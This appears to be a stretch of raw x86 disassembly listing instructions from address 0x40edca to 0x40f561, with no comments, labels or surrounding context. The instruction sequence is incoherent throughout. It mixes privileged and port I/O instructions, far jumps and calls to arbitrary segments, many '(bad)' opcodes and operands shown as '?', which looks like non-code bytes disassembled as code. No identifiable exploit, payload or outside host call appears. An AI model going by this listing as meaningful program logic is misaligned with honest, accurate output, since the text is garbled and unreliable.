  40edca:	or     DWORD PTR [esi],ebx
  40edcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edcd:	cmp    eax,DWORD PTR [ebx-0x7d]
  40edd0:	add    BYTE PTR ds:0x3ea636fc,al
  40edd6:	add    dl,ah
  40edd8:	bound  eax,QWORD PTR [ebp+0x51]
  40eddb:	inc    ebp
  40eddc:	dec    edi
  40eddd:	cmp    bl,BYTE PTR [ecx]
  40eddf:	adc    dl,0x4
  40ede2:	retf   
  40ede3:	cdq    
  40ede4:	mov    DWORD PTR fs:[esp+eax*4],ebx
  40ede8:	push   edx
  40ede9:	mov    dh,dl
  40edeb:	push   ecx
  40edec:	rcl    cl,1
  40edee:	call   0x50a8:0x6216aba2
  40edf5:	(bad)  
  40edf6:	xor    eax,0xb334d6b5
  40edfb:	push   0x2e
  40edfd:	or     ebp,DWORD PTR [ecx+0x480ae628]
  40ee03:	xchg   ebp,eax
  40ee04:	mov    ah,0xc1
  40ee06:	and    BYTE PTR [edx],al
  40ee08:	into   
  40ee09:	cdq    
  40ee0a:	pop    ss
  40ee0b:	push   ds
  40ee0c:	popa   
  40ee0d:	sub    ecx,DWORD PTR [edx+0x1c0b28ec]
  40ee13:	push   0x56f2ac37
  40ee18:	dec    esp
  40ee19:	jbe    0x40ee2f
  40ee1b:	mov    ch,0xd8
  40ee1d:	ficomp WORD PTR [ebx-0x1]
  40ee20:	mov    edi,0xc034a3f
  40ee25:	scas   al,BYTE PTR es:[edi]
  40ee26:	pop    ebp
  40ee27:	mov    ebx,0x42085616
  40ee2c:	cs pop es
  40ee2e:	repnz mov fs,WORD PTR gs:[esp+ebp*1+0x40]
  40ee34:	push   ebp
  40ee35:	inc    edi
  40ee36:	mov    edi,0x7fba5f4e
  40ee3b:	out    dx,al
  40ee3c:	scas   eax,DWORD PTR es:[edi]
  40ee3d:	inc    esp
  40ee3e:	mov    eax,0xd264f688
  40ee43:	sbb    edx,DWORD PTR [esi]
  40ee45:	(bad)  
  40ee46:	into   
  40ee47:	sbb    eax,0x5855744e
  40ee4c:	lods   eax,DWORD PTR ds:[esi]
  40ee4d:	xor    ah,dl
  40ee4f:	mov    dh,bl
  40ee51:	adc    eax,0x5a49ed6
  40ee56:	push   esp
  40ee57:	mov    eax,ds:0x46104cdd
  40ee5c:	fstp   QWORD PTR [esi-0x2c]
  40ee5f:	hlt    
  40ee60:	push   cs
  40ee61:	sti    
  40ee62:	cmp    ebp,eax
  40ee64:	add    BYTE PTR [esi],dh
  40ee66:	mov    bl,0x6a
  40ee68:	push   esp
  40ee69:	cwde   
  40ee6a:	adc    al,BYTE PTR [eax]
  40ee6c:	shr    al,0x16
  40ee6f:	adc    eax,0xfca35874
  40ee74:	xchg   edx,eax
  40ee75:	shl    BYTE PTR [eax+esi*1-0x25f4301c],1
  40ee7c:	xor    DWORD PTR [esi],edx
  40ee7e:	and    DWORD PTR es:[esi-0x4e],eax
  40ee82:	inc    edi
  40ee83:	dec    esp
  40ee84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee85:	lock test al,0x29
  40ee88:	rcl    ch,1
  40ee8a:	add    al,0xd
  40ee8c:	mov    dh,0xc
  40ee8e:	mov    bh,dl
  40ee90:	pop    esp
  40ee91:	or     BYTE PTR [eax],bh
  40ee93:	mov    al,0xed
  40ee95:	enter  0xb458,0x68
  40ee99:	xor    al,0xbe
  40ee9b:	cdq    
  40ee9c:	cmp    bl,al
  40ee9e:	hlt    
  40ee9f:	mov    ss,WORD PTR [ebp+0x15]
  40eea2:	mov    dh,0x69
  40eea4:	sub    BYTE PTR [ecx-0x7d],0x60
  40eea8:	push   ss
  40eea9:	mov    ch,ah
  40eeab:	cmp    al,0x1
  40eead:	pop    edx
  40eeae:	inc    ebp
  40eeaf:	adc    ebp,DWORD PTR [esp+eax*1-0x7e]
  40eeb3:	mov    ebx,DWORD PTR [esi]
  40eeb5:	mov    es,WORD PTR [ecx-0x23b30560]
  40eebb:	rcl    BYTE PTR [eax-0x5f],1
  40eebe:	fcomp  DWORD PTR [edx+0x4ce85a74]
  40eec4:	gs xchg edx,eax
  40eec6:	cmp    ch,BYTE PTR [edx]
  40eec8:	dec    esp
  40eec9:	pop    ebx
  40eeca:	shl    dl,1
  40eecc:	and    eax,DWORD PTR [eax]
  40eece:	mov    edi,eax
  40eed0:	push   ss
  40eed1:	repnz or eax,DWORD PTR cs:[edx-0x7c915da]
  40eed9:	cmp    BYTE PTR [edx],al
  40eedb:	mov    esi,0x163654f2
  40eee0:	les    eax,FWORD PTR [edx-0x696d9f7b]
  40eee6:	pop    eax
  40eee7:	pop    edx
  40eee8:	inc    ebx
  40eee9:	sub    DWORD PTR ds:0x1cafb4bc,0xdbd43124
  40eef3:	inc    eax
  40eef4:	sub    BYTE PTR [eax-0x6de565d6],0xad
  40eefb:	inc    esi
  40eefc:	jmp    0x2891:0xd0ba1eee
  40ef03:	adc    BYTE PTR [esi-0x79e6a882],cl
  40ef09:	popa   
  40ef0a:	add    eax,0xf61ebe3b
  40ef0f:	cmp    al,0xef
  40ef11:	xchg   edi,eax
  40ef12:	fidiv  WORD PTR [eax]
  40ef14:	push   ss
  40ef15:	or     eax,0x5e5fe68e
  40ef1a:	into   
  40ef1b:	repnz add BYTE PTR [edi*4+0x14a00900],al
  40ef23:	ficom  WORD PTR [eax-0x10]
  40ef26:	shr    DWORD PTR [ebx+ebp*1+0x68],1
  40ef2a:	push   ss
  40ef2b:	mov    cl,0xe4
  40ef2d:	dec    eax
  40ef2e:	pusha  
  40ef2f:	lahf   
  40ef30:	jo     0x40ef9c
  40ef32:	push   edx
  40ef33:	jno    0x40ef3a
  40ef35:	iret   
  40ef36:	js     0x40eedb
  40ef38:	mov    edi,ss
  40ef3a:	add    BYTE PTR [edi],dl
  40ef3c:	or     BYTE PTR [edx+0x79],al
  40ef3f:	ficomp WORD PTR [ebp-0x7e8aa166]
  40ef45:	(bad)  
  40ef46:	push   eax
  40ef47:	stc    
  40ef48:	sbb    BYTE PTR [eax],bl
  40ef4a:	mov    dh,0x0
  40ef4c:	inc    ecx
  40ef4d:	push   0x7
  40ef4f:	adc    al,0x35
  40ef51:	adc    eax,0xf60982d1
  40ef56:	mov    bl,bl
  40ef58:	in     al,dx
  40ef59:	arpl   WORD PTR [edx+edi*1-0x80],bp
  40ef5d:	push   esi
  40ef5e:	push   ss
  40ef5f:	lea    ecx,[ebx+0x3a]
  40ef62:	mov    edi,0xd06c1c8e
  40ef67:	push   ebp
  40ef68:	icebp  
  40ef69:	dec    esp
  40ef6a:	xchg   edx,eax
  40ef6b:	mov    al,ds:0xcd3e309a
  40ef70:	test   ch,ch
  40ef72:	push   edx
  40ef73:	fdivr  DWORD PTR [edx+0x62]
  40ef76:	mov    al,0x96
  40ef78:	cmp    BYTE PTR [esi-0x2eca45c3],bh
  40ef7e:	pusha  
  40ef7f:	aas    
  40ef80:	jbe    0x40efe5
  40ef82:	push   ebx
  40ef83:	push   ss
  40ef84:	xchg   edx,eax
  40ef85:	add    eax,0x995405b2
  40ef8a:	or     al,0x3c
  40ef8c:	mov    edx,0x48b64d46
  40ef91:	push   esp
  40ef92:	loopne 0x40f00e
  40ef94:	bound  edi,QWORD PTR [edx+0x1a]
  40ef97:	retf   
  40ef98:	push   edx
  40ef99:	adc    cl,bl
  40ef9b:	or     bh,BYTE PTR [esi]
  40ef9d:	mov    WORD PTR ds:0x7429759e,cs
  40efa3:	xchg   BYTE PTR [esi+ebx*4],cl
  40efa6:	push   ecx
  40efa7:	sar    BYTE PTR [edx+0x5cfc5a0a],1
  40efad:	loop   0x40ef7f
  40efaf:	sti    
  40efb0:	pusha  
  40efb1:	imul   edx,eax,0x585b0dba
  40efb7:	fs push ebp
  40efb9:	push   0xfffffffe
  40efbb:	test   ah,dh
  40efbd:	xchg   ebp,eax
  40efbe:	mov    eax,ds:0xdad15ce9
  40efc3:	fnstenv [eax-0x16]
  40efc6:	add    BYTE PTR [ebp-0x18],bl
  40efc9:	in     al,0x68
  40efcb:	imul   BYTE PTR [ebp+0x2d120ab]
  40efd1:	xor    eax,0xa730ee
  40efd6:	xchg   ecx,eax
  40efd7:	mov    esi,0xaced52e2
  40efdc:	sub    ch,BYTE PTR [eax-0x11]
  40efdf:	xchg   esi,eax
  40efe0:	sub    esi,DWORD PTR [edi-0x3083f800]
  40efe6:	in     al,0xbd
  40efe8:	cmp    al,0x56
  40efea:	retf   0xfb37
  40efed:	add    BYTE PTR [esp+eax*4+0x76],dh
  40eff1:	push   ss
  40eff2:	adc    DWORD PTR [ecx+0x7b774cdc],edx
  40eff8:	add    BYTE PTR [ecx],ch
  40effa:	push   esi
  40effb:	sbb    DWORD PTR [esi+0x19c73497],esi
  40f001:	es push esp
  40f003:	lahf   
  40f004:	test   al,0x7c
  40f006:	mov    al,ds:0x1a75a3a3
  40f00b:	dec    esp
  40f00c:	push   ss
  40f00d:	dec    ecx
  40f00e:	pop    edx
  40f00f:	mov    al,al
  40f011:	fwait
  40f012:	stos   BYTE PTR es:[edi],al
  40f013:	push   0xc806b16a
  40f018:	fucomp st(1)
  40f01a:	sbb    edx,esp
  40f01c:	repz dec esp
  40f01e:	test   BYTE PTR [edx+0x47],ah
  40f021:	imul   ebp,edx,0x4a
  40f024:	cmp    cl,BYTE PTR [esi-0x39277ae]
  40f02a:	pushf  
  40f02b:	cmp    BYTE PTR [esi+0x35],dh
  40f02e:	xor    al,0x78
  40f030:	push   DWORD PTR [eax+0x743bd422]
  40f036:	xor    edi,0xffffffc7
  40f039:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f03a:	rcl    ecx,1
  40f03c:	sub    BYTE PTR [ebx],dh
  40f03e:	pushf  
  40f03f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f040:	and    al,0xdb
  40f042:	sbb    BYTE PTR [esi+0x50],bl
  40f045:	loopne 0x40f08b
  40f047:	fidiv  DWORD PTR [esi+0x67fcef06]
  40f04d:	sahf   
  40f04e:	add    BYTE PTR [ecx+0x43],dl
  40f051:	pop    ebx
  40f052:	rcl    al,1
  40f054:	sbb    al,0xdd
  40f056:	sub    al,0x58
  40f058:	faddp  st(5),st
  40f05a:	hlt    
  40f05b:	cmp    cl,0x14
  40f05e:	addps  xmm0,XMMWORD PTR [eax-0x53d983da]
  40f065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f066:	data16 mov ah,0xab
  40f069:	hlt    
  40f06a:	inc    ebp
  40f06b:	or     eax,0x98f9c20d
  40f070:	push   cs
  40f071:	mov    dh,0x4d
  40f073:	push   ds
  40f074:	add    BYTE PTR ds:0xfd506dfe,ah
  40f07a:	xchg   ecx,eax
  40f07b:	sahf   
  40f07c:	dec    BYTE PTR [ebp-0x7b2c1900]
  40f082:	jp     0x40f03d
  40f084:	into   
  40f085:	push   esi
  40f086:	cdq    
  40f087:	test   eax,0xcf52169a
  40f08c:	xor    BYTE PTR [eax],bh
  40f08e:	loop   0x40f08c
  40f090:	ret    0x15b4
  40f093:	sub    al,0xf8
  40f095:	xor    BYTE PTR [edx-0x4ecb39d5],dl
  40f09b:	xor    BYTE PTR [esp+edx*8-0x198a65f6],bh
  40f0a2:	pop    eax
  40f0a3:	sbb    al,0x16
  40f0a5:	push   eax
  40f0a6:	test   BYTE PTR [ebp+0xa],0xf1
  40f0aa:	xor    cl,dl
  40f0ac:	test   al,0x58
  40f0ae:	mov    dh,0x1b
  40f0b0:	arpl   sp,bx
  40f0b2:	fwait
  40f0b3:	cli    
  40f0b4:	and    dl,BYTE PTR [ebx]
  40f0b6:	shl    BYTE PTR [esi+ebx*4-0x12],1
  40f0ba:	js     0x40f0b8
  40f0bc:	pop    esp
  40f0bd:	push   esp
  40f0be:	and    BYTE PTR [ecx+0xa227f9],0x40
  40f0c5:	dec    esp
  40f0c6:	adc    edi,DWORD PTR [esi]
  40f0c8:	out    0xeb,al
  40f0ca:	push   0xffffffc0
  40f0cc:	mov    ebx,0xb93262
  40f0d1:	mov    dl,0x54
  40f0d3:	push   eax
  40f0d4:	ret    0x3a14
  40f0d7:	sub    eax,0xf97e6aea
  40f0dc:	add    BYTE PTR [edx+0x6b93007e],ah
  40f0e2:	(bad)  
  40f0e3:	aad    0xe0
  40f0e5:	out    dx,al
  40f0e6:	js     0x40f13b
  40f0e8:	push   ebp
  40f0e9:	push   ebx
  40f0ea:	push   ebx
  40f0eb:	scas   al,BYTE PTR es:[edi]
  40f0ec:	adc    BYTE PTR [edi+0xa],dh
  40f0ef:	cmp    esi,eax
  40f0f1:	clc    
  40f0f2:	fs test al,0x5
  40f0f5:	pop    ebp
  40f0f6:	dec    ebp
  40f0f7:	sub    eax,0xe4144a7c
  40f0fc:	or     al,0xe2
  40f0fe:	push   ebp
  40f0ff:	rcl    BYTE PTR [eax+0x70],1
  40f102:	or     dh,BYTE PTR ds:0x92c8d1b4
  40f108:	cld    
  40f109:	or     DWORD PTR [eax],esp
  40f10b:	imul   ecx,ebp,0x1a
  40f10e:	shr    BYTE PTR [edx-0x42],0xe2
  40f112:	adc    DWORD PTR [esi],0x6d02e81c
  40f118:	push   ebx
  40f119:	add    eax,0x8aacc3fa
  40f11e:	pop    esi
  40f11f:	mov    gs,WORD PTR ds:0x4d7151d0
  40f125:	outs   dx,BYTE PTR ds:[esi]
  40f126:	xor    eax,0x5b666a04
  40f12b:	test   al,0x78
  40f12d:	rcl    BYTE PTR [esi-0xa],1
  40f130:	mov    bl,0xfa
  40f132:	sahf   
  40f133:	cmp    eax,0x41827614
  40f138:	stos   DWORD PTR es:[edi],eax
  40f139:	jns    0x40f17c
  40f13b:	sub    eax,esi
  40f13d:	dec    ecx
  40f13e:	push   ss
  40f13f:	nop
  40f140:	rol    BYTE PTR [edx-0x14],0x0
  40f144:	std    
  40f145:	in     al,dx
  40f146:	mov    edi,0xe0a30a84
  40f14b:	icebp  
  40f14c:	jmp    0x8a9b:0x81cc6c43
  40f153:	adc    al,0x5
  40f155:	lock dec eax
  40f157:	shl    BYTE PTR [esi-0x799c0b0e],1
  40f15d:	mov    ch,0xd0
  40f15f:	push   ecx
  40f160:	gs jo  0x40f117
  40f163:	out    0x42,al
  40f165:	repz push 0x57508f11
  40f16b:	scas   al,BYTE PTR es:[edi]
  40f16c:	cwde   
  40f16d:	dec    esi
  40f16e:	(bad)  
  40f16f:	dec    esp
  40f170:	data16 jmp 0x40f19b
  40f173:	adc    cl,dh
  40f175:	mov    WORD PTR [ebx-0x40],?
  40f178:	stos   DWORD PTR es:[edi],eax
  40f179:	and    ch,dh
  40f17b:	fmul   QWORD PTR [ecx-0x44]
  40f17e:	mov    al,ds:0xc4f6da0d
  40f183:	shr    BYTE PTR [ecx-0x28],0xd0
  40f187:	push   ebp
  40f188:	je     0x40f19b
  40f18a:	push   esi
  40f18b:	sti    
  40f18c:	xor    ah,BYTE PTR [eax-0x7d20010a]
  40f192:	mov    es,WORD PTR [ebx-0x5e]
  40f195:	scas   eax,DWORD PTR es:[edi]
  40f196:	hlt    
  40f197:	inc    esi
  40f198:	pusha  
  40f199:	sar    BYTE PTR [ecx+eiz*4],cl
  40f19c:	mov    cl,0x4a
  40f19e:	lea    ebx,[eax+0x56]
  40f1a1:	ins    BYTE PTR es:[edi],dx
  40f1a2:	pop    esi
  40f1a3:	inc    edx
  40f1a4:	fdivrp st(0),st
  40f1a6:	add    BYTE PTR [ebx-0x3d],ah
  40f1a9:	dec    esi
  40f1aa:	push   0x12
  40f1ac:	iret   
  40f1ad:	adc    BYTE PTR [esi],al
  40f1af:	aam    0x5a
  40f1b1:	xchg   DWORD PTR [ecx+0x48],edx
  40f1b4:	aaa    
  40f1b5:	into   
  40f1b6:	dec    DWORD PTR [esi+0x1adc9ad9]
  40f1bc:	dec    edx
  40f1bd:	dec    ebp
  40f1be:	pop    ds
  40f1bf:	or     BYTE PTR [ebx],bl
  40f1c1:	cmp    BYTE PTR [esi-0x5e4e0527],0xc0
  40f1c8:	and    DWORD PTR [esp+ebp*2+0x6d508860],esi
  40f1cf:	jp     0x40f224
  40f1d1:	inc    ebx
  40f1d2:	xlat   BYTE PTR ds:[ebx]
  40f1d3:	mov    cl,0x92
  40f1d5:	xor    edi,DWORD PTR [eax]
  40f1d7:	push   0xa8d055ce
  40f1dc:	push   es
  40f1dd:	cmp    ch,BYTE PTR [ecx+esi*4+0x58]
  40f1e1:	push   ss
  40f1e2:	dec    eax
  40f1e3:	in     eax,0xf0
  40f1e5:	mov    ah,BYTE PTR [ecx]
  40f1e7:	cwde   
  40f1e8:	or     DWORD PTR [eax+0x26],esp
  40f1eb:	cmp    al,BYTE PTR [esi]
  40f1ed:	jo     0x40f189
  40f1ef:	ins    DWORD PTR es:[edi],dx
  40f1f0:	mov    dh,0x41
  40f1f2:	into   
  40f1f3:	sbb    ch,dl
  40f1f5:	out    dx,al
  40f1f6:	add    al,0x82
  40f1f8:	repz jbe 0x40f217
  40f1fb:	call   0x4c2a:0x3a1b5595
  40f202:	retf   0xfb12
  40f205:	mov    WORD PTR [ebx],ss
  40f207:	push   ss
  40f208:	neg    BYTE PTR [ebp+0x61992142]
  40f20e:	call   0xad05:0x805cee60
  40f215:	inc    edx
  40f216:	mov    WORD PTR [esi],ss
  40f218:	das    
  40f219:	mov    edx,0x7fac4ce8
  40f21e:	add    BYTE PTR [eax+esi*4+0x35],cl
  40f222:	xor    al,0xdb
  40f224:	push   ecx
  40f225:	ror    DWORD PTR [esi+0x2cbc77d0],cl
  40f22b:	push   edx
  40f22c:	sbb    DWORD PTR [ebx+edx*8+0x34],esi
  40f230:	pop    ebp
  40f231:	(bad)  
  40f232:	or     al,al
  40f234:	(bad)  
  40f235:	(bad)  
  40f236:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f238:	bound  esp,QWORD PTR [esi+0x464d34d9]
  40f23e:	or     ch,BYTE PTR [ebx+0x26]
  40f241:	js     0x40f1e4
  40f243:	fwait
  40f244:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f245:	imul   ebx,DWORD PTR [edx+0x5af7df0],0x9a00b356
  40f24f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f250:	imul   ebx,DWORD PTR [edx+0x24bf617a],0x1c2f859
  40f25a:	mov    ds:0x5cda9669,eax
  40f25f:	shl    DWORD PTR ds:0x1546b051,0x21
  40f266:	mov    ds:0x24c5b075,al
  40f26b:	sbb    bl,BYTE PTR [edx]
  40f26d:	inc    esp
  40f26e:	push   eax
  40f26f:	mov    ebx,0xc27e4a9c
  40f274:	adc    bh,BYTE PTR [ebp+0x52d5aac0]
  40f27a:	(bad)  
  40f27b:	call   0x87898116
  40f280:	jno    0x40f282
  40f282:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f284:	imul   edi,DWORD PTR [edx-0x778013ea],0xc64587fe
  40f28e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f28f:	imul   ebx,DWORD PTR [edx+0xfcdf9b],0x2be731b7
  40f299:	fimul  DWORD PTR [edx-0x38e864ea]
  40f29f:	xor    al,0xc5
  40f2a1:	inc    ecx
  40f2a2:	inc    eax
  40f2a3:	jne    0x40f22f
  40f2a5:	fs test al,0x9b
  40f2a8:	mov    ds:0x3fc8bbf9,al
  40f2ad:	add    cl,ch
  40f2af:	pusha  
  40f2b0:	add    BYTE PTR ds:0x8ed68f54,cl
  40f2b6:	mov    esp,0x3aba2a26
  40f2bb:	push   esp
  40f2bc:	sub    ch,BYTE PTR [esi+ebp*1-0x20]
  40f2c0:	shl    BYTE PTR ds:[eax],1
  40f2c3:	rcl    DWORD PTR [esi+0x54],0xd1
  40f2c7:	(bad)  
  40f2c8:	outs   dx,DWORD PTR ds:[esi]
  40f2c9:	pop    esi
  40f2ca:	xchg   ebx,eax
  40f2cb:	ret    0x707d
  40f2ce:	and    dh,BYTE PTR [edi]
  40f2d0:	lock push edi
  40f2d2:	pop    es
  40f2d3:	cmc    
  40f2d4:	add    al,BYTE PTR [esi]
  40f2d6:	jmp    0x40f2fd
  40f2d8:	add    BYTE PTR [ecx+0x4b2cfdda],ch
  40f2de:	ffreep st(0)
  40f2e0:	push   cs
  40f2e1:	mov    ds:0xc2aac4e4,al
  40f2e6:	(bad)
  40f2eb:	xchg   ebp,eax
  40f2ec:	pushf  
  40f2ed:	cmp    DWORD PTR [esi+ebp*1-0x6c],eax
  40f2f1:	inc    esp
  40f2f2:	ret    
  40f2f3:	mov    ds:0xb58888a6,al
  40f2f8:	sub    al,0xe6
  40f2fa:	inc    esi
  40f2fb:	div    BYTE PTR es:0xd4cf86f4
  40f302:	push   esi
  40f303:	pop    edi
  40f304:	sub    BYTE PTR [esi+0x0],0xaa
  40f308:	mov    ds,WORD PTR [edx+ebp*1+0x3a]
  40f30c:	or     ch,ah
  40f30e:	push   cs
  40f30f:	dec    eax
  40f310:	cli    
  40f311:	pop    edx
  40f312:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f313:	cmp    al,0x49
  40f315:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f316:	out    dx,al
  40f317:	push   esp
  40f318:	aad    0xd5
  40f31a:	call   0x1f3e:0x3ea0df46
  40f321:	add    BYTE PTR [esi-0x2fa9754a],cl
  40f327:	or     cl,BYTE PTR [ebx]
  40f329:	adc    dh,BYTE PTR [esi+0x27a0d57c]
  40f32f:	mov    eax,0x615127c
  40f334:	stos   BYTE PTR es:[edi],al
  40f335:	ret    0x8e40
  40f338:	lods   eax,DWORD PTR ds:[esi]
  40f339:	and    ah,BYTE PTR [eax-0x4bab21ae]
  40f33f:	sbb    eax,0xd0865548
  40f344:	push   0x3e0f7c
  40f349:	neg    esi
  40f34b:	dec    edx
  40f34c:	xchg   BYTE PTR [ebx-0x219bfb3e],ah
  40f352:	cld    
  40f353:	add    eax,0x3aa2b605
  40f358:	ja     0x40f342
  40f35a:	cdq    
  40f35b:	sub    al,0x16
  40f35d:	ins    BYTE PTR es:[edi],dx
  40f35e:	out    dx,eax
  40f35f:	test   BYTE PTR [edi],cl
  40f361:	or     bh,BYTE PTR [edx]
  40f363:	mov    esi,0x19be5da8
  40f368:	cld    
  40f369:	and    ebx,DWORD PTR [esi]
  40f36b:	lds    esp,FWORD PTR [esi-0x45]
  40f36e:	stos   BYTE PTR es:[edi],al
  40f36f:	stos   BYTE PTR es:[edi],al
  40f370:	ror    BYTE PTR [ecx+0x29da7ec6],cl
  40f376:	adc    DWORD PTR [edx+eiz*8],eax
  40f379:	mov    eax,ds:0x9d8550c3
  40f37e:	loop   0x40f319
  40f380:	cwde   
  40f381:	mov    ah,0x11
  40f383:	(bad)  
  40f384:	mov    eax,ds:0xf5e6aab4
  40f389:	ss adc al,0xe7
  40f38c:	loop   0x40f396
  40f38e:	ficomp WORD PTR [edx]
  40f390:	les    edx,FWORD PTR [eax+0x51]
  40f393:	int    0x74
  40f395:	xor    edx,esp
  40f397:	inc    esp
  40f398:	adc    dl,cl
  40f39a:	aad    0x9a
  40f39c:	or     bl,dh
  40f39e:	in     eax,dx
  40f39f:	push   edx
  40f3a0:	xchg   esi,eax
  40f3a1:	lods   al,BYTE PTR ds:[esi]
  40f3a2:	(bad)  
  40f3a3:	mov    WORD PTR [edi],?
  40f3a5:	rcr    al,0xd5
  40f3a8:	push   eax
  40f3a9:	push   0xffffffd1
  40f3ab:	cmp    BYTE PTR [esi-0x2e4448fe],al
  40f3b1:	ds mov ch,0xfd
  40f3b4:	inc    cl
  40f3b6:	pop    ecx
  40f3b7:	add    al,dl
  40f3b9:	mov    ds,WORD PTR [edi+0x1616b2e8]
  40f3bf:	ficom  DWORD PTR [edx]
  40f3c1:	fimul  DWORD PTR [edx]
  40f3c3:	mov    bl,0x7c
  40f3c5:	call   0xbdbd5ea2
  40f3ca:	in     eax,dx
  40f3cb:	sub    dl,BYTE PTR [eax]
  40f3cd:	mov    ebp,0xf2da5922
  40f3d2:	pusha  
  40f3d3:	call   0xc87c8ec
  40f3d8:	mov    ah,0x7
  40f3da:	test   al,0x94
  40f3dc:	xor    al,0xb4
  40f3de:	int3   
  40f3df:	sub    dh,dl
  40f3e1:	add    BYTE PTR [edx-0x274d7afe],0x68
  40f3e8:	in     al,0x95
  40f3ea:	pop    esi
  40f3eb:	mov    al,0xe0
  40f3ed:	push   esp
  40f3ee:	retf   0xc46e
  40f3f1:	and    al,0xc7
  40f3f3:	js     0x40f401
  40f3f5:	mov    ecx,0x3aae4e00
  40f3fa:	sub    DWORD PTR [esi],0x9e94de6b
  40f400:	arpl   WORD PTR [eax],si
  40f402:	add    al,0x70
  40f404:	sub    eax,0x49aca2f8
  40f409:	push   es
  40f40a:	jae    0x40f3e0
  40f40c:	aam    0x83
  40f40e:	inc    edx
  40f40f:	adc    BYTE PTR ds:0x14abc4de,ch
  40f415:	aam    0x2
  40f417:	pop    ecx
  40f418:	fistp  DWORD PTR [edx+0x45]
  40f41b:	(bad)  
  40f41c:	mov    ss,esp
  40f41e:	call   0x77fa:0xb405bee1
  40f425:	jbe    0x40f414
  40f427:	mov    al,0xa6
  40f429:	lods   eax,DWORD PTR ds:[esi]
  40f42a:	mov    BYTE PTR [esp+eiz*2+0x67e8300a],dh
  40f431:	mov    eax,0x43b63a36
  40f436:	imul   esi,DWORD PTR [edx+0x34],0xffffff94
  40f43a:	mov    ebp,DWORD PTR [edx+edi*1+0x3f]
  40f43e:	jo     0x40f3cf
  40f440:	push   esi
  40f441:	add    eax,0x617c50a8
  40f446:	stos   BYTE PTR es:[edi],al
  40f447:	add    BYTE PTR [esi],dh
  40f449:	cwde   
  40f44a:	call   0x53e1dbdd
  40f44f:	mov    ah,0x8a
  40f451:	retf   0xe9ff
  40f454:	add    BYTE PTR [ebx+0x734000cc],bl
  40f45a:	add    BYTE PTR [edx-0x8],cl
  40f45d:	push   ebx
  40f45e:	jbe    0x40f3fc
  40f460:	pop    eax
  40f461:	cmp    esi,0x6a56d68a
  40f467:	xor    eax,0x167ffa07
  40f46c:	cs fs cwde 
  40f46f:	add    BYTE PTR [ebp+0x10],cl
  40f472:	add    BYTE PTR [edi],bl
  40f474:	dec    edi
  40f475:	dec    edi
  40f476:	(bad)  
  40f477:	mov    ds:0x14898e66,al
  40f47c:	int3   
  40f47d:	or     BYTE PTR [edx-0x5],bl
  40f480:	add    DWORD PTR [edx-0x4de14f93],ebx
  40f486:	adc    al,0xbe
  40f488:	mov    eax,ds:0x3ae71016
  40f48d:	les    edx,FWORD PTR [edx+0x47]
  40f490:	push   ebx
  40f491:	pop    esp
  40f492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f493:	rol    eax,cl
  40f495:	sub    edi,esp
  40f497:	fcom   st(1)
  40f499:	mov    eax,ds:0x20547424
  40f49e:	pusha  
  40f49f:	jp     0x40f48e
  40f4a1:	add    BYTE PTR [esi-0x5b714fa],0x4c
  40f4a8:	sbb    dl,BYTE PTR [ebp-0x2caae532]
  40f4ae:	mov    ds:0x6a7ed070,eax
  40f4b3:	cs xchg esp,eax
  40f4b5:	test   DWORD PTR [edi+eax*4+0x44415563],ebx
  40f4bc:	dec    esi
  40f4bd:	in     eax,dx
  40f4be:	jmp    0x4be2:0xb43083d8
  40f4c5:	popf   
  40f4c6:	inc    eax
  40f4c7:	lahf   
  40f4c8:	jmp    0x302d:0x75d1488
  40f4cf:	test   eax,0x484c88b2
  40f4d4:	test   ch,dh
  40f4d6:	sbb    ch,BYTE PTR [ebx]
  40f4d8:	mov    edx,0xa0ecb682
  40f4dd:	cmp    al,0x7a
  40f4df:	mov    al,ds:0xd0f726b7
  40f4e4:	mov    ch,BYTE PTR [edx]
  40f4e6:	fcom   QWORD PTR [eax-0x6e]
  40f4e9:	shr    dh,1
  40f4eb:	push   esi
  40f4ec:	sahf   
  40f4ed:	pusha  
  40f4ee:	inc    edx
  40f4ef:	loopne 0x40f47a
  40f4f1:	fmul   DWORD PTR [edx+esi*8-0x42]
  40f4f5:	sub    BYTE PTR [ebp-0x257e9dc4],0xb0
  40f4fc:	shr    al,cl
  40f4fe:	inc    dx
  40f500:	adc    BYTE PTR [esp+edi*2-0x2f78bcbf],ch
  40f507:	push   ds
  40f508:	pushf  
  40f509:	enter  0xea42,0xd6
  40f50d:	out    0x0,al
  40f50f:	inc    edi
  40f510:	sub    esi,DWORD PTR [ebx]
  40f512:	ins    DWORD PTR es:[edi],dx
  40f513:	add    eax,0xf6645ecd
  40f518:	in     eax,0x76
  40f51a:	int    0x35
  40f51c:	jl     0x40f4ca
  40f51e:	add    al,0xcc
  40f520:	and    BYTE PTR [ecx+0x74],0x3c
  40f524:	or     BYTE PTR [ecx+eax*1-0x3a],bh
  40f528:	or     ebp,DWORD PTR [edi]
  40f52a:	in     al,0xb2
  40f52c:	add    BYTE PTR [edx+edi*8+0x60],ch
  40f530:	call   0xe2ee12e5
  40f535:	jb     0x40f51f
  40f537:	or     BYTE PTR [eax],dh
  40f539:	xchg   esi,eax
  40f53a:	jbe    0x40f5a6
  40f53c:	pop    edx
  40f53d:	hlt    
  40f53e:	add    eax,0x302d2978
  40f543:	adc    DWORD PTR [eax-0x20],ecx
  40f546:	xchg   edi,eax
  40f547:	mov    edx,0xb9740d58
  40f54c:	sbb    DWORD PTR ds:[ebp+edx*1+0x1b],edx
  40f551:	inc    esp
  40f552:	mov    esp,0xc2a9b61f
  40f557:	push   ss
  40f558:	mov    ah,BYTE PTR [ecx+0x38]
  40f55b:	sbb    al,0x4
  40f55d:	jo     0x40f553
  40f55f:	or     ebp,DWORD PTR [edi]
  40f561:	jo     0x40f5dd
